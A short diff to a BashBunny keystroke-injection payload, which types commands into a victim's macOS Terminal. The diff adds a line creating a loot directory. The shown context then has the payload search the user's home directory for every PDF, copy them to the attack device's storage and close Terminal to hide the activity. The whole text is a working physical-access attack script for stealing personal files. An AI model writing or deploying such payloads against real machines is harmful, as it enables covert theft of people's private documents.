@@ -21,6 +21,8 @@ QUACK DELAY 1000
 QUACK STRING terminal
 QUACK ENTER
 QUACK DELAY 3000
+QUACK STRING mkdir -p $lootdir
+QUACK ENTER
 # Find all PDFs stored in the user's home directory, and copy them over to the BashBunny storage.
 QUACK STRING find \~ -name \'*.pdf\' -exec cp \"{}\" $lootdir \\\;\; killall Terminal
 QUACK ENTER
